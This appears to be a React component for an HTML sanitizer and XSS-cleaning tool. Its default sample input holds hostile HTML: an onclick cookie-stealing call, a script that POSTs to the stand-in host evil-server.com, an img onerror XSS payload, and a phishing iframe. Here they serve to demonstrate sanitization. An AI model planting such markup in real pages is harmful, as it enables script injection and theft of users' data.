import React, { useState } from 'react';
import { ToolShell, CopyButton } from '../../components/ToolShell';
import { sanitizeHtml } from '../../engines/dev/htmlSanitizeTools';

const DIRTY_SAMPLE = `<article>
  <h1>Safe Document Title</h1>
  <p>Here is normal text with a <a href="https://example.com" onclick="stealCookies()">valid link</a>.</p>
  <script>
    fetch('https://evil-server.com/log', { method: 'POST' });
  </script>
  <img src="avatar.png" onerror="alert('xss attack')" />
  <iframe src="https://phishing.site"></iframe>
</article>`;

export const HtmlSanitizeView: React.FC = () => {
  const [rawHtml, setRawHtml] = useState(DIRTY_SAMPLE);

  const report = sanitizeHtml(rawHtml);

  return (
    <ToolShell
      title="Safe HTML Sanitizer & XSS Cleaner"
      category="dev"
      description="Purge executable scripts, iframe embeds, and inline DOM event handlers (onclick, onerror) to prevent XSS."
      icon="🛡️"
      onReset={() => setRawHtml(DIRTY_SAMPLE)}
    >
      <div className="space-y-6">
        <div>
          <label className="block text-xs font-mono text-neutral-400 mb-2">Unsanitized HTML Input</label>
          <textarea
            value={rawHtml}
            onChange={(e) => setRawHtml(e.target.value)}
            rows={7}
            placeholder="Paste raw or untrusted HTML here..."
            className="w-full bg-neutral-950 border border-neutral-800 rounded-xl p-3 text-xs text-neutral-100 font-mono resize-y focus:outline-none focus:border-neutral-600"
          />
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          <div className="p-3.5 bg-neutral-950/80 border border-neutral-800 rounded-xl">
            <span className="text-xs text-neutral-500 font-mono">Scripts Stripped</span>
            <div className="text-xl font-bold text-rose-400 mt-1">{report.removedScriptsCount} tags</div>
          </div>
          <div className="p-3.5 bg-neutral-950/80 border border-neutral-800 rounded-xl">
            <span className="text-xs text-neutral-500 font-mono">Event Handlers Purged</span>
            <div className="text-xl font-bold text-amber-400 mt-1">{report.removedEventHandlersCount} attributes</div>
          </div>
          <div className="p-3.5 bg-neutral-950/80 border border-neutral-800 rounded-xl">
            <span className="text-xs text-neutral-500 font-mono">Dangerous Tags Removed</span>
            <div className="text-xl font-bold text-purple-400 mt-1">{report.removedTagsCount} tags</div>
          </div>
        </div>

        <div>
          <div className="flex justify-between items-center mb-2">
            <label className="text-xs font-mono text-neutral-400">Sanitized HTML Code</label>
            <CopyButton text={report.sanitizedHtml} label="Copy Clean HTML" />
          </div>
          <textarea
            readOnly
            value={report.sanitizedHtml}
            rows={6}
            className="w-full bg-neutral-950 border border-neutral-800 rounded-xl p-3 text-xs text-emerald-400 font-mono resize-y focus:outline-none"
          />
        </div>

        <div>
          <label className="block text-xs font-mono text-neutral-400 mb-2">Stripped Plain Text Only</label>
          <div className="p-4 bg-neutral-950/50 border border-neutral-800 rounded-xl text-xs text-neutral-300 font-sans">
            {report.cleanedText || 'No text extracted.'}
          </div>
        </div>
      </div>
    </ToolShell>
  );
};
